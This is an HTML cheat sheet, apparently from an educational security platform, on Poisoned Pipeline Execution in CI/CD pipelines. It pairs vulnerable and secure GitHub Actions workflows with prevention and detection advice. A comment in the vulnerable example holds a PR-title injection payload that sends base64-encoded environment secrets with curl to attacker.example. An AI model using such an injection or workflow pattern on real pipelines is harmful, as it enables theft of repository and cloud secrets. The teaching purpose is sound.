@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CICD-SEC-4: Poisoned Pipeline Execution - Quick Reference</title>
+    <link rel="stylesheet" href="../assets/cheat-sheet-style.css">
+    <style>
+        .back-nav {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 1000;
+        }
+
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 20px;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: var(--darker-color);
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: 600;
+            border: 1px solid var(--primary-color);
+            box-shadow: none;
+            transition: all 0.3s;
+        }
+
+        .back-btn:hover {
+            transform: translateX(-5px);
+            box-shadow: none;
+        }
+
+        @media print {
+            .back-nav { display: none; }
+        }
+    </style>
+</head>
+<body>
+    <div class="back-nav">
+        <a href="../index.html" class="back-btn">
+            <i class="fas fa-arrow-left"></i> Back to Cheat Sheets
+        </a>
+    </div>
+
+    <div class="cheat-sheet">
+        <!-- Header -->
+        <div class="header">
+            <h1>☠️ Poisoned Pipeline Execution (PPE)</h1>
+            <p class="subtitle">OWASP Top 10 CI/CD Security Risks - CICD-SEC-4</p>
+            <span class="category">CRITICAL RISK</span>
+        </div>
+
+        <!-- Main Content -->
+        <div class="content">
+            <!-- Overview Section -->
+            <div class="section full-width">
+                <h2>📋 What Is It?</h2>
+                <p><strong>Poisoned Pipeline Execution (PPE)</strong> is the risk that an attacker who can influence the <em>definition</em> of a CI/CD pipeline — or the files and commands it runs — gets their own code executed inside the pipeline. Once code runs there it inherits the pipeline's identity: its secrets, cloud credentials, registry tokens, and access to source and artifacts. <strong>A pipeline is code with privileges</strong>, and that code usually lives in the same repo it builds. The vulnerability is a person who should only be able to <em>propose</em> a change being able to <em>run privileged automation</em>.</p>
+
+                <div class="stats-grid">
+                    <div class="stat-box">
+                        <span class="value">CICD-SEC-4</span>
+                        <span class="label">OWASP Rank</span>
+                    </div>
+                    <div class="stat-box">
+                        <span class="value">D/I/3PE</span>
+                        <span class="label">Three Variants</span>
+                    </div>
+                    <div class="stat-box">
+                        <span class="value">Fork PRs</span>
+                        <span class="label">Biggest Surface</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Common Exploit Patterns -->
+            <div class="section">
+                <h2>⚠️ Common Exploits</h2>
+                <ul>
+                    <li><strong>Direct PPE (D-PPE):</strong> Attacker edits the pipeline file itself on a branch/PR the CI runs with secrets</li>
+                    <li><strong>Indirect PPE (I-PPE):</strong> Trusted workflow runs an attacker-editable <code>Makefile</code>, hook, or test config</li>
+                    <li><strong>Public PPE (3PE):</strong> An outsider's fork PR triggers a privileged run — no repo permissions needed</li>
+                    <li><strong>pull_request_target Misuse:</strong> Runs with secrets + write token, then checks out untrusted PR code</li>
+                    <li><strong>Script Injection:</strong> PR title/branch/commit interpolated into a shell <code>run:</code> block</li>
+                    <li><strong>Unpinned Actions:</strong> Mutable <code>@main</code>/<code>@v1</code> repointed to malicious code</li>
+                    <li><strong>Self-Hosted Runner Abuse:</strong> Fork code on a persistent, in-network host</li>
+                    <li><strong>Over-Privileged Token:</strong> Default write GITHUB_TOKEN a poisoned job can abuse</li>
+                </ul>
+            </div>
+
+            <!-- Attack Flow -->
+            <div class="section">
+                <h2>🔴 Attack Flow</h2>
+                <div class="attack-flow">
+1. Recon: read workflows, triggers, secrets, action pins<br>
+   <span class="arrow">↓</span><br>
+2. Find the seam: a privileged run of influenceable content<br>
+   <span class="arrow">↓</span><br>
+3. Inject: malicious step, script edit, crafted PR field, poisoned action<br>
+   <span class="arrow">↓</span><br>
+4. Execute with privilege: code runs as the pipeline identity<br>
+   <span class="arrow">↓</span><br>
+5. <strong>IMPACT: Dump secrets, tamper artifacts, pivot to cloud!</strong>
+                </div>
+            </div>
+
+            <!-- Vulnerable Code Example -->
+            <div class="section full-width">
+                <h2>❌ Vulnerable Code</h2>
+                <div class="code-block vulnerable">
+<span class="comment"># 3PE: pull_request_target runs in base context with secrets + write token,</span>
+<span class="comment"># then checks out and runs the outsider's fork code.</span>
+<span class="keyword">on</span>:
+  <span class="keyword">pull_request_target</span>:
+<span class="keyword">jobs</span>:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}   <span class="comment"># untrusted fork code</span>
+      - run: npm ci                <span class="comment"># attacker's lifecycle hooks run WITH secrets</span>
+      - run: npm test
+        env:
+          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}   <span class="comment"># readable by attacker code</span>
+
+<span class="comment"># Script injection: attacker-controlled PR title inlined into the shell</span>
+- name: greet
+  run: echo "PR title: ${{ github.event.pull_request.title }}"
+  <span class="comment"># title = '"; curl attacker.example -d "$(env|base64)"; echo "'  -> injection</span>
+
+<span class="comment"># Unpinned action + no permissions block (token may default to write)</span>
+- uses: some-org/deploy@main       <span class="comment"># mutable ref, repointable to malware</span>
+                </div>
+            </div>
+
+            <!-- Secure Code Example -->
+            <div class="section full-width">
+                <h2>✅ Secure Code</h2>
+                <div class="code-block secure">
+<span class="comment"># Fork code runs on pull_request (NO secrets, read-only token).</span>
+<span class="keyword">on</span>:
+  <span class="keyword">pull_request</span>:
+<span class="keyword">permissions</span>:
+  contents: read                 <span class="comment"># least-privilege default token</span>
+<span class="keyword">jobs</span>:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4  <span class="comment"># PR head, but nothing sensitive is present</span>
+      - run: npm ci
+      - run: npm test              <span class="comment"># no secrets in scope; a hook gains nothing</span>
+
+<span class="comment"># Untrusted event data arrives as DATA via env, then quoted — no injection.</span>
+- name: greet
+  env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+  run: echo "PR title: $PR_TITLE"
+
+<span class="comment"># Third-party actions pinned to a full, immutable commit SHA</span>
+- uses: some-org/deploy@9f8e7d6c5b4a39281706f5e4d3c2b1a09f8e7d6c   <span class="comment"># v2.0.1</span>
+
+<span class="comment"># If a fork PR truly needs a secret: run untrusted code in a no-secret job,</span>
+<span class="comment"># then do the privileged step in a separate trusted workflow that never</span>
+<span class="comment"># checks out PR code. Use ephemeral runners; forks never touch privileged ones.</span>
+                </div>
+            </div>
+
+            <!-- Prevention Checklist -->
+            <div class="section">
+                <h2>✓ Prevention Checklist</h2>
+                <ul class="checklist">
+                    <li>Never run untrusted code with secrets in scope</li>
+                    <li>Prefer pull_request over pull_request_target for fork PRs</li>
+                    <li>Require approval before workflows run on fork PRs</li>
+                    <li>Pin all third-party actions to a full commit SHA</li>
+                    <li>Pass event data via env vars and quote it — never inline</li>
+                    <li>Set explicit least-privilege permissions: on the token</li>
+                    <li>Split build from deploy; keep deploy creds off build jobs</li>
+                    <li>Use ephemeral runners; keep forks off self-hosted runners</li>
+                    <li>Protect + mask deploy secrets; scope to protected branches</li>
+                    <li>Review scripts/hooks/test configs as security-critical code</li>
+                </ul>
+            </div>
+
+            <!-- Detection & Tools -->
+            <div class="section">
+                <h2>🔍 Detection & Tools</h2>
+                <h3>Pipeline Hardening:</h3>
+                <div class="tools-list">
+                    <span class="tool-tag">StepSecurity Harden-Runner</span>
+                    <span class="tool-tag">GitHub OIDC</span>
+                    <span class="tool-tag">Ephemeral Runners</span>
+                    <span class="tool-tag">actionlint</span>
+                    <span class="tool-tag">Ratchet (SHA pinning)</span>
+                    <span class="tool-tag">OpenSSF Scorecard</span>
+                </div>
+
+                <h3>Static Review:</h3>
+                <div class="tools-list">
+                    <span class="tool-tag">Semgrep</span>
+                    <span class="tool-tag">CodeQL Actions queries</span>
+                    <span class="tool-tag">Poutine</span>
+                    <span class="tool-tag">zizmor</span>
+                    <span class="tool-tag">OPA / Conftest</span>
+                </div>
+
+                <h3>How to Test:</h3>
+                <ul>
+                    <li>Grep workflows for <code>pull_request_target</code> + PR-head checkout</li>
+                    <li>Find <code>${{ }}</code> event fields inlined into <code>run:</code> blocks</li>
+                    <li>List actions referenced by mutable tags/branches</li>
+                    <li>Check whether fork PRs can reach secrets or self-hosted runners</li>
+                    <li>Confirm an explicit least-privilege permissions block exists</li>
+                    <li>Verify build and deploy credentials are separated</li>
+                </ul>
+            </div>
+
+            <!-- Real-World Examples -->
+            <div class="section full-width">
+                <h2>🌍 Real-World (Incident Classes)</h2>
+                <ul>
+                    <li><strong>pull_request_target Secret Theft via Fork PR:</strong> Public repos used the privileged trigger for triage, then also checked out and ran PR code; researchers demonstrated outsiders reading repo/org secrets, and many popular open-source maintainers received coordinated disclosures for exactly this shape.</li>
+                    <li><strong>Compromised / Swapped Third-Party Action:</strong> Workflows referencing an action by a mutable <code>@main</code>/<code>@v1</code> ran malicious code after the action's repo, maintainer account, or tag was repointed — one action can poison thousands of pipelines.</li>
+                    <li><strong>Self-Hosted Runner Abused by Fork PR:</strong> A fork PR executed on a non-ephemeral, in-network runner, giving code execution on a long-lived host — persistence, credential harvesting, and lateral movement.</li>
+                    <li><strong>Script Injection via Untrusted Event Data:</strong> A PR title containing shell metacharacters, interpolated into a <code>run:</code> step, executed attacker commands with the workflow's privileges.</li>
+                </ul>
+            </div>
+
+            <!-- Quick Reference -->
+            <div class="section">
+                <h2>📌 Quick Tips</h2>
+                <ul>
+                    <li><span class="badge critical">DO NOT</span> run PR code with secrets present</li>
+                    <li><span class="badge critical">DO NOT</span> inline event data into shell steps</li>
+                    <li><span class="badge critical">DO NOT</span> pin actions to mutable tags</li>
+                    <li><span class="badge high">DO</span> pin actions to full commit SHAs</li>
+                    <li><span class="badge high">DO</span> separate build from deploy credentials</li>
+                    <li><span class="badge high">DO</span> set least-privilege token permissions</li>
+                    <li><span class="badge medium">DO</span> use ephemeral runners for untrusted PRs</li>
+                </ul>
+            </div>
+
+            <!-- Compliance -->
+            <div class="section">
+                <h2>📜 Compliance</h2>
+                <p><strong>Related Standards:</strong></p>
+                <ul>
+                    <li><span class="badge medium">SLSA</span> Build L2/L3 - Isolation</li>
+                    <li><span class="badge medium">NIST SSDF</span> PS.1 / PW.6 - Build Integrity</li>
+                    <li><span class="badge medium">ISO 27001</span> A.14 - Secure Development</li>
+                    <li><span class="badge medium">SOC 2</span> CC7.1 - System Operations</li>
+                    <li><span class="badge medium">CIS</span> Software Supply Chain Benchmark</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p><strong>OWASP Top 10 CI/CD Security Risks — Educational Platform</strong> | <a href="../index.html">All Cheat Sheets</a> | <a href="/">Home</a></p>
+            <p>Full lesson: <a href="/labs/cicd/OWASP-CICD/CICD04-Poisoned-Pipeline-Execution/overview.html">Read the deep dive →</a></p>
+            <p>📥 To download as PDF: Print this page (Ctrl+P) → Save as PDF</p>
+        </div>
+    </div>
+</body>
+</html>
